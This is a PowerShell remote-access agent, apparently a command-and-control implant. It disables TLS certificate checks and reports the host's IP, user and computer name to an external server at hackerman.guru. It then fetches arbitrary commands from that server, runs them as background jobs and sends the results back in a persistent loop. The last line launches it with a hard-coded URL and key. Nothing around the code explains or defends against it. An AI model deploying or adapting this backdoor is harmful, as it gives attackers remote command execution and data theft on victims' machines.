function Start-Agent {
    param(
            [Parameter(Mandatory=$true)] $Url,
            [Parameter(Mandatory=$true)] $Key
        )

add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@

	
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    function Create-Agent($HandlerUrl, $ApiKey)
    {
        $properties = @{
            ID = "0"
            InternalIP = "0.0.0.0"
            ExternalIP = "0.0.0.0"
            User = "unknown"
            ComputerName = "unknown"
            Status = "sleep"
            CreatedAt = "unknown"
            CheckedIn = "unknown"
            Registered = "false"
            Killed = "false"
            SleepTime = "50000"
            ApiKey = $ApiKey
            HandlerUrl = $HandlerUrl
        }

        $object = New-Object -TypeName PSObject -Property $properties

        Add-Member -memberType ScriptMethod -InputObject $object -Name "Slp" -Value {
            Start-Sleep -milliseconds $this.SleepTime
        }

        Add-Member -memberType ScriptMethod -InputObject $object -Name "USI" -Value {
            try {
                $this.InternalIP = (
                    Get-NetIPConfiguration |
                    Where-Object {
                        $_.IPv4DefaultGateway -ne $null -and
                        $_.NetAdapter.Status -ne "Disconnected"
                    }
                ).IPv4Address.IPAddress
                $this.User = $env:UserName
                $this.ComputerName = $env:ComputerName
                return "true"
            }
            catch {
                Start-Sleep -milliseconds 10000
                return "false"
            }
        }

        Add-Member -memberType ScriptMethod -InputObject $object -Name "GetJobIDs" -Value {
            try{
                $postparams = @{
                    api_key= $this.ApiKey
                    agent_id = $this.ID
                }
                $posturl = $this.HandlerUrl + "getjobids.php"
                $response = Invoke-WebRequest -Uri $posturl -Method POST -Body $postParams
                if ($response.Content -eq "false")
                {
                    return "false"
                }
                
                $responseobj = $response.Content | ConvertFrom-Json
                return $responseobj
            }
            catch{
                Start-Sleep -milliseconds 10000
                return "false"
            }
            
        }

        Add-Member -memberType ScriptMethod -InputObject $object -Name "ResetAgent" -Value {
            $this.ID = "0"
            $this.InternalIP = "0.0.0.0"
            $this.ExternalIP = "0.0.0.0"
            $this.User = "unknown"
            $this.ComputerName = "unknown"
            $this.Registered = "false"
        }

        Add-Member -memberType ScriptMethod -InputObject $object -Name "CheckIn" -Value {
			try {
                $postparams = @{
                    api_key= $this.ApiKey
                    id = $this.ID
                    internal_ip = $this.InternalIP
                    external_ip = $this.ExternalIP
                    user = $this.User
                    computer_name = $this.ComputerName
                    status = $this.Status
                    checked_in = $this.CheckedIn
                    registered = $this.Registered
                    handler_url = $this.HandlerUrl
                    sleep_time = $this.SleepTime
                    killed = $this.Killed
                }
				
				
				
				
                $posturl = $this.HandlerUrl + "checkin.php"
				
				
                $response = Invoke-WebRequest -Uri $posturl -Method POST -Body $postParams
				
                $responseobj = $response.Content | ConvertFrom-Json
				
                if(!$responseobj.id)
                {
                    Start-Sleep -milliseconds 10000
                    $this.ResetAgent()
                    return "false"
                }
                else{
                    $this.ID = $responseobj.id
                    $this.InternalIP = $responseobj.internal_ip
                    $this.Status = $responseobj.status
                    $this.CreatedAt = $responseobj.created_at
                    $this.Registered = $responseobj.registered
                    $this.SleepTime = $responseobj.sleep_time
                    if($responseobj.killed -eq 0)
                    {
                        $this.Killed = "false"
                    }
                    else
                    {
                        $this.Killed = "true"
                    }
                    return "true"
                }
            } 
            catch {
                Start-Sleep -milliseconds 10000
                return "false 3"
            } 
        }   

        return $object
    }

    function Create-Job($HandlerUrl, $ApiKey, $JobID, $AgentID)
    {
        $properties = @{
            JobID = $JobID
            AgentID = $AgentID
            ApiKey = $ApiKey
            HandlerUrl = $HandlerUrl
            C = "none"
            CR = "none"
            Complete = "0"
            Fetched = "0"
        }

        $object = New-Object -TypeName PSObject -Property $properties

        Add-Member -memberType ScriptMethod -InputObject $object -Name "GJBI" -Value {
            try {
                $postparams = @{
                    api_key = $this.ApiKey
                    agent_id = $this.AgentID
                    job_id = $this.JobID
                }
                $posturl = $this.HandlerUrl + "getjobbyid.php"
                $response = Invoke-WebRequest -Uri $posturl -Method POST -Body $postParams
                
                $responseobj = $response.Content | ConvertFrom-Json
    
                $this.C= $responseobj.command
                $this.Fetched = "1"

                return "true"
            }
            catch {
                Start-Sleep -milliseconds 10000
                return "false"
            }
        }

        Add-Member -memberType ScriptMethod -InputObject $object -Name "RnC" -Value {
            try{
                $jobC = $this.C
                $NewSB = [scriptblock]::Create("$jobC")
                Start-Job -Name $this.JobID -ScriptBlock $NewSB
                $l = 1
                $counter = 0
                while($l -eq 1)
                {
                    if((Get-Job -Name $this.JobID).State -eq "Completed")
                    {
                        $this.CR = Receive-Job -Name $this.JobID | Out-String
                        $l = 0
                    }
                    else
                    {
                        $counter += 1
                        Start-Sleep -milliseconds 5000
                        if($counter -eq 5)
                        {
                            $l = 0
                        }
                    }
                }
                return "true"
            }
            catch{
                Start-Sleep -milliseconds 10000
                return "false"
            }
            
            #$cr = IEX $this.C | Out-String
            #$this.CR = $cr
        }

        Add-Member -memberType ScriptMethod -InputObject $object -Name "SCR" -Value {
            try {
                $postparams = @{
                    api_key = $this.ApiKey
                    job_id = $this.JobID
                    command_response = $this.CR.ToString()
                }
                $posturl = $this.HandlerUrl + "updatejob.php"
                $response = Invoke-WebRequest -Uri $posturl -Method POST -Body $postParams
                
                $responseobj = $response.Content | ConvertFrom-Json
            }
            catch {
                Start-Sleep -milliseconds 10000
                continue
            }
        }

        return $object
    }
    
	
	
    $agent = Create-Agent -ApiKey $Key -HandlerUrl $url
    
    while($agent.Killed -eq "false")
    {
        $updated = $agent.USI()
        if($updated -eq "true")
        {		
            $checkedin = $agent.CheckIn()
            if($checkedin -eq "true")
            {
                $jobIDs = $agent.GetJobIDs()
                if($jobIDs -ne "false"){
                    
                    $jobs = @()
                    foreach ($jobID in $jobIDs)
                    {
                        $job = Create-Job -HandlerUrl $agent.HandlerUrl -ApiKey $agent.ApiKey -JobID $JobID.id -AgentID $agent.ID
                        $gotjob = $job.GJBI()
                        if($gotjob -eq "true")
                        {
                            $jobs += $job
                        }
                    }
                    if($jobs.count -gt 0){
                        foreach ($job in $jobs)
                        {
                            $jobcomplete = $job.RnC()
                            if($jobcomplete -eq "true")
                            {
                                $job.SCR()
                            }
                        }
                    }
                    
                }
            }
        }
        $agent.Slp()
    }

}
Start-Agent -Url "https://hackerman.guru/overcast/public/" -Key "5f4dcc3b5aa765d61d8327deb882cf99"